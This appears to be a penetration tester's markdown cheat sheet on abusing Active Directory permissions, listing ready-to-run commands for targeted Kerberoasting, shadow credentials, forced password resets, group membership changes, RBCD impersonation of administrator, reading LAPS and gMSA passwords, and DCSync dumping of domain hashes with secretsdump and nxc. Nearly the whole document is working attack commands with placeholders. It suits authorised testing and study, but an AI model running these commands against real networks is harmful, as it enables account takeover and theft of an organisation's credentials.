- [GenericWrite on User](#genericwrite-on-user)
  - [Targeted Kerberoasting](#targeted-kerberoasting)
  - [ShadowCredentials](#shadowcredentials)
- [GenericALL](#genericall)
  - [Change Password](#change-password)
  - [Add User to a Group](#add-user-to-a-group)
  - [Resource-Based Constrained Delegation (RBCD)](#resource-based-constrained-delegation-rbcd)
  - [GenericALL on OU](#genericall-on-ou)
- [ForceChangePassword](#forcechangepassword)
- [AddMember](#addmember)
- [AddSelf](#addself)
- [WriteOwner](#writeowner)
- [WriteSPN](#writespn)
- [AddKeyCredentialLink](#addkeycredentiallink)
- [ReadLAPSPassword](#readlapspassword)
- [ReadGMSAPassword](#readgmsapassword)
- [DCSync](#dcsync)
- [Resources](#resources)
## GenericWrite on User
> Update object's attributes
### Targeted Kerberoasting
```
targetedKerberoast.py -d domain --dc-ip ip -u username -p password --dc-host dc --request-user target_user
```
```
hashcat -m 13100 -a 0 <hash_file> rockyou.txt --force
```
```
john <hash_file> --wordlist=rockyou.txt
```
### ShadowCredentials
```
certipy shadow auto -u username@domain -p password -account target_user -dc-ip ip
```
Using Kerberos
```
certipy shadow auto -username username@domain -k -account target_user -dc-ip ip
```
## GenericALL
> Full rights to the object (add users to a group or reset user's password)
### Change Password
```
bloodyAD --host dc -d domain -u username -p password set password target new_password
```
```
net rpc password 'username' 'new_password' -U 'domain'/'username'%'hash' -S 'dc' --pw-nt-hash
```
```
net rpc password 'username' 'new_password' -U 'domain'/'username'%'password' -S 'dc'
```
### Add user to a group
```
net rpc group addmem target_group username -U domain/username -S dc
```
```
bloodyAD --host dc -d domain -u username -p password add groupMember target_group target_username
```
### RBCD
```
rbcd.py -delegate-from machine_name -delegate-to target -dc-ip ip -action write 'domain/username:password'
```
```
getST.py -spn 'cifs/dc' -impersonate administrator -dc-ip ip 'domain/machine_name:password
```
```
export KRB5CCNAME=administrator.ccache
```
### GenericALL on OU
```
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal username -target-dn 'OU_DN' domain/username:password
```
## ForceChangePassword
> Ability to change user's password
```
net rpc password <TargetUser> <new_password> -U "DOMAIN"/"ControlledUser"%"Password" -S <DomainController>
```
```
bloodyAD --host ip -d dc -u username -p password set password target_userename new_password
```
```
python rpcchangepwd.py <domain>/<username>:<password>@<ip> -newpass <new_password>
```
```
nxc smb domain -u username -p password -M change-password -o USER='target_username' NEWPASS='new_password'
```
## AddMember
```
net rpc group addmem target_group username -U domain/username -S dc
```
```
bloodyAD.py --host dc -d domain -u username -p password add groupMember target_group user_to_add
```
## AddSelf
> The user has the ability to add itself to the target group
```
bloodyAD.py --host dc -d domain -u username -p password add groupMember target_group username
```
## WriteOwner
> Change object owner to attacker controlled user take over the object
```
owneredit.py -action write -new-owner username -target target domain/username:password
```
```
dacledit.py -action 'write' -rights 'FullControl' -principal username -target-dn dn 'domain/username:password'
```
or
```
dacledit.py -action 'write' -rights 'WriteMembers' -principal username -target-dn dn 'domain/username:password'
```
```
bloodyAD.py --host dc -d domain -u username -p password add groupMember target_group username
```
## WriteSPN
> The ability to write to the "serviceprincipalname" attribute to the target user
```
bloodyAD --host dc -d domain -u username -p password set object target servicePrincipalName -v 'domain/meow'
```
```
GetUserSPNs.py domain/username:password -dc-ip ip -request
```
or
```
targetedKerberoast.py -d domain --dc-ip ip -u username -p password --dc-host dc --request-user target_user
```
## AddKeyCredentialLink
```
pywhisker.py -d domain --dc-ip ip -u username -p password --target target --action add
```
```
gettgtpkinit.py -cert-pfx file.pfx -pfx-pass pfx_password domain/target ticket.ccache -dc-ip ip
```
```
getnthash.py domain/target -k key -dc-ip ip
```
or
```
certipy shadow auto -u username@domain -p password -account target_user -dc-ip ip
```
## ReadLAPSPassword
```
nxc smb target -u username -p password --laps
```
## ReadGMSAPassword
```
nxc ldap target -u username -p password --gmsa
```
## DCSync
> A user or a computer has the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All permission on the domain
```
secretsdump.py domain/username:password@domain
```
```
secretsdump.py domain/username@domain -hashes :hash
```
```
secretsdump.py dc -k
```
```
nxc smb target -u username -p password --ntds
```
```
nxc smb target --use-kcache --ntds
```
# Resources
- https://www.thehacker.recipes/ad/movement/dacl/
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse
- https://mayfly277.github.io/posts/GOADv2-pwning-part11/
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
